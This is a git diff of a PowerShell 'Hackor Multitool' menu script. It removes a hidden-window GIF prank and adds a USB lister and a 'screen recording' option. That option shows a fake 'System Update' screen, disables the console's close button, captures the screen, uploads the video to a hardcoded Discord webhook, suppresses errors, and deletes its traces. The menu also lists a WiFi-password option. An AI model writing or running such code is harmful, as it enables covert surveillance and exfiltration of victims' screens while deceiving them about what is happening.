@@ -15,7 +15,7 @@ function Show-Menu {
 "@
     Write-Host "================ Hackor Multitool ================"
     Write-Host "1: List WiFi Passwords"
-    Write-Host "2: Option Two"
+    Write-Host "2: List USB Devices"
     Write-Host "3: Option Three"
     Write-Host "Q: Quit"
     Write-Host "==========================================="
@@ -66,101 +66,185 @@ function Start-HackorMultitool {
                 pause
             }
             '2' {
-                Write-Host "You chose Option Two"
-                $scriptBlock = {
-                    Add-Type -AssemblyName System.Windows.Forms
-                    Add-Type -AssemblyName System.Drawing
-
-                    $gifCount = 0
-                    $maxGifs = 20
-                    $gifPath = 'C:\Users\theob\Documents\GitHub\Scripts\dan6t0z-5cc622d3-63b8-4f82-b158-0230e658e9c0.gif'
-                    $forms = New-Object System.Collections.Generic.List[System.Windows.Forms.Form]
-
-                    function Show-GifViewer {
-                        if ($script:gifCount -ge $maxGifs) {
-                            return
-                        }
-
-                        $form = New-Object System.Windows.Forms.Form
-                        $form.Text = "GIF Viewer #$($script:gifCount + 1)"
-                        $form.Size = New-Object System.Drawing.Size(300, 200)
-                        $form.FormBorderStyle = 'None'
-                        $form.TopMost = $true
-
-                        $screen = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea
-                        $form.StartPosition = 'Manual'
-                        $form.Location = New-Object System.Drawing.Point(
-                            (Get-Random -Minimum 0 -Maximum ($screen.Width - $form.Width)),
-                            (Get-Random -Minimum 0 -Maximum ($screen.Height - $form.Height))
-                        )
-
-                        $pictureBox = New-Object System.Windows.Forms.PictureBox
-                        $pictureBox.SizeMode = 'StretchImage'
-                        $pictureBox.Dock = 'Fill'
-
-                        if (Test-Path $gifPath) {
-                            $pictureBox.Image = [System.Drawing.Image]::FromFile($gifPath)
-                        } else {
-                            Write-Host "GIF file not found: $gifPath"
-                            return
-                        }
-
-                        $form.Controls.Add($pictureBox)
-
-                        $form.Add_FormClosed({
-                            $pictureBox.Image.Dispose()
-                            $pictureBox.Dispose()
-                            $forms.Remove($form)
-                            $script:gifCount--
-                        })
-
-                        $forms.Add($form)
-                        $form.Show()
-                        $script:gifCount++
-
-                        # Start the bouncing animation
-                        $timer = New-Object System.Windows.Forms.Timer
-                        $timer.Interval = 20
-                        $dx = 5
-                        $dy = 5
-
-                        $timer.Add_Tick({
-                            $newX = $form.Location.X + $dx
-                            $newY = $form.Location.Y + $dy
-
-                            if ($newX -le 0 -or $newX -ge ($screen.Width - $form.Width)) { 
-                                $dx = -$dx 
-                            }
-                            if ($newY -le 0 -or $newY -ge ($screen.Height - $form.Height)) { 
-                                $dy = -$dy 
-                            }
-
-                            $form.Location = New-Object System.Drawing.Point([int]$newX, [int]$newY)
-                        })
-                        $timer.Start()
-                    }
-
-                    $spawnTimer = New-Object System.Windows.Forms.Timer
-                    $spawnTimer.Interval = 1000 # 1 second
-                    $spawnTimer.Add_Tick({
-                        if ($script:gifCount -lt $maxGifs) {
-                            Show-GifViewer
-                        } else {
-                            $spawnTimer.Stop()
-                        }
-                    })
-                    $spawnTimer.Start()
-
-                    [System.Windows.Forms.Application]::Run()
-                }
-
-                $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptBlock))
-                Start-Process powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-EncodedCommand", $encodedCommand
-                pause
+                Clear-Host
+                Write-Host "================ Hackor Multitool -> USB Devices ================"
+                Write-Host "Listing all USB devices..."
+                Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB' } | Format-Table -AutoSize
+                Write-Host "Press any key to continue..."
+                $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
             }
             '3' {
-                Write-Host "You chose Option Three"
-                pause
+                Clear-Host
+                Write-Host "================ Hackor Multitool -> Screen Recording ================"
+                $duration = Read-Host "Enter the duration of the screen recording in seconds"
+
+                if ($duration -match '^\d+$') {
+                    $tempPath = [System.IO.Path]::GetTempPath()
+                    $outputFolder = Join-Path $tempPath "screen_capture_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
+                    New-Item -ItemType Directory -Path $outputFolder -Force | Out-Null
+
+                    Write-Host "Starting screen recording for $duration seconds..."
+                    
+                    try {
+                        # Load required assemblies
+                        Add-Type -AssemblyName System.Windows.Forms
+                        Add-Type -AssemblyName System.Drawing
+
+                        # Modify the current PowerShell window
+                        $host.UI.RawUI.WindowTitle = "System Update"
+                        $host.UI.RawUI.BackgroundColor = "DarkBlue"
+                        $host.UI.RawUI.ForegroundColor = "White"
+                        Clear-Host
+                        Write-Host "`n`n`n`n`n`n`n`n"
+                        Write-Host "                Updating Shell. Do not close or the update might corrupt" -ForegroundColor Yellow
+                        Write-Host "`n`n`n`n`n`n`n`n"
+
+                        # Disable close button
+                        $signature = @"
+                        [DllImport("user32.dll")]
+                        public static extern bool EnableMenuItem(IntPtr hMenu, uint uIDEnableItem, uint uEnable);
+                        [DllImport("user32.dll")]
+                        public static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);
+                        [DllImport("kernel32.dll")]
+                        public static extern IntPtr GetConsoleWindow();
+"@
+                        Add-Type -MemberDefinition $signature -Name Win32Utils -Namespace Win32
+                        $hwnd = [Win32.Win32Utils]::GetConsoleWindow()
+                        $hMenu = [Win32.Win32Utils]::GetSystemMenu($hwnd, $false)
+                        [Win32.Win32Utils]::EnableMenuItem($hMenu, 0xF060, 0x00000001)
+
+                        $startTime = Get-Date
+                        $endTime = $startTime.AddSeconds($duration)
+
+                        $frameCount = 0
+
+                        # Get the size of the primary screen using WinAPI
+                        Add-Type @"
+                        using System;
+                        using System.Runtime.InteropServices;
+
+                        public class ScreenCapture
+                        {
+                            [DllImport("user32.dll")]
+                            public static extern IntPtr GetDesktopWindow();
+
+                            [DllImport("user32.dll")]
+                            public static extern IntPtr GetWindowDC(IntPtr hWnd);
+
+                            [DllImport("gdi32.dll")]
+                            public static extern int GetDeviceCaps(IntPtr hdc, int nIndex);
+
+                            [DllImport("user32.dll")]
+                            public static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);
+
+                            public static int[] GetScreenSize()
+                            {
+                                IntPtr hWnd = GetDesktopWindow();
+                                IntPtr hDC = GetWindowDC(hWnd);
+                                int width = GetDeviceCaps(hDC, 118); // DESKTOPHORZRES
+                                int height = GetDeviceCaps(hDC, 117); // DESKTOPVERTRES
+                                ReleaseDC(hWnd, hDC);
+                                return new int[] { width, height };
+                            }
+                        }
+"@
+
+                        $screenSize = [ScreenCapture]::GetScreenSize()
+                        $width = $screenSize[0]
+                        $height = $screenSize[1]
+
+                        $stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
+
+                        while ((Get-Date) -lt $endTime) {
+                            $bitmap = New-Object System.Drawing.Bitmap($width, $height)
+                            $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+                            $graphics.CopyFromScreen(0, 0, 0, 0, $bitmap.Size)
+
+                            # Capture cursor
+                            $cursorPosition = [System.Windows.Forms.Cursor]::Position
+                            $cursor = [System.Windows.Forms.Cursors]::Default
+                            $cursor.Draw($graphics, [System.Drawing.Rectangle]::new($cursorPosition.X, $cursorPosition.Y, $cursor.Size.Width, $cursor.Size.Height))
+
+                            $framePath = Join-Path $outputFolder "frame_$frameCount.png"
+                            $bitmap.Save($framePath, [System.Drawing.Imaging.ImageFormat]::Png)
+
+                            $graphics.Dispose()
+                            $bitmap.Dispose()
+
+                            $frameCount++
+                            Start-Sleep -Milliseconds 10  # Adjust this value to control frame rate
+                        }
+
+                        $stopwatch.Stop()
+                        $actualFps = $frameCount / $stopwatch.Elapsed.TotalSeconds
+
+                        # Check if FFmpeg is installed
+                        $ffmpegPath = "ffmpeg.exe"
+                        if (-not (Get-Command $ffmpegPath -ErrorAction SilentlyContinue)) {
+                            $ffmpegFolder = Join-Path $tempPath "ffmpeg"
+                            $ffmpegPath = Join-Path $ffmpegFolder "ffmpeg.exe"
+
+                            if (-not (Test-Path $ffmpegPath)) {
+                                $ffmpegUrl = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
+                                $ffmpegZip = Join-Path $tempPath "ffmpeg.zip"
+
+                                Invoke-WebRequest -Uri $ffmpegUrl -OutFile $ffmpegZip
+                                Expand-Archive -Path $ffmpegZip -DestinationPath $ffmpegFolder -Force
+                                Move-Item -Path (Join-Path $ffmpegFolder "ffmpeg-master-latest-win64-gpl\bin\*") -Destination $ffmpegFolder
+                                Remove-Item -Path (Join-Path $ffmpegFolder "ffmpeg-master-latest-win64-gpl") -Recurse -Force
+                                Remove-Item -Path $ffmpegZip -Force
+                            }
+                        }
+
+                        $outputVideo = Join-Path $outputFolder "output.mkv"
+                        
+                        # Use MKV format with PCM audio, set the output framerate to match the recording
+                        $ffmpegCommand = "& '$ffmpegPath' -y -framerate $actualFps -i '$outputFolder\frame_%d.png' -c:v libx264 -preset medium -crf 23 -r $actualFps -c:a pcm_s16le '$outputVideo'"
+                        
+                        $ffmpegOutput = Invoke-Expression $ffmpegCommand 2>&1
+                        
+                        if (Test-Path $outputVideo) {
+                            # Upload video to Discord webhook
+                            $webhookUrl = "https://discord.com/api/webhooks/1098750753935474800/XSUW-ZgqQmr3zD9FwL1W2iwbtoDBqvX9Y-SzpR6HFQxUgRYal7YdPYjxAsxJaHz2ev7J"
+                            $fileName = [System.IO.Path]::GetFileName($outputVideo)
+                            $fileBytes = [System.IO.File]::ReadAllBytes($outputVideo)
+                            $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
+                            $boundary = [System.Guid]::NewGuid().ToString()
+                            $LF = "`r`n"
+
+                            $bodyLines = (
+                                "--$boundary",
+                                "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+                                "Content-Type: application/octet-stream$LF",
+                                $fileEnc,
+                                "--$boundary--$LF"
+                            ) -join $LF
+
+                            try {
+                                Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=`"$boundary`"" -Body $bodyLines
+                            }
+                            catch {
+                                # Silently handle any upload errors
+                            }
+                        }
+
+                        # Clean up
+                        Remove-Item "$outputFolder\frame_*.png"
+                        Remove-Item $outputVideo -ErrorAction SilentlyContinue
+                        Remove-Item $outputFolder -Recurse -Force -ErrorAction SilentlyContinue
+                    }
+                    catch {
+                        # Silently handle any errors
+                    }
+                    finally {
+                        # Close all PowerShell windows
+                        Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object { $_.CloseMainWindow() | Out-Null }
+                    }
+                }
+                else {
+                    Write-Host "Invalid duration. Please enter a valid number of seconds."
+                    Start-Sleep -Seconds 2
+                }
             }
             'q' {
                 return
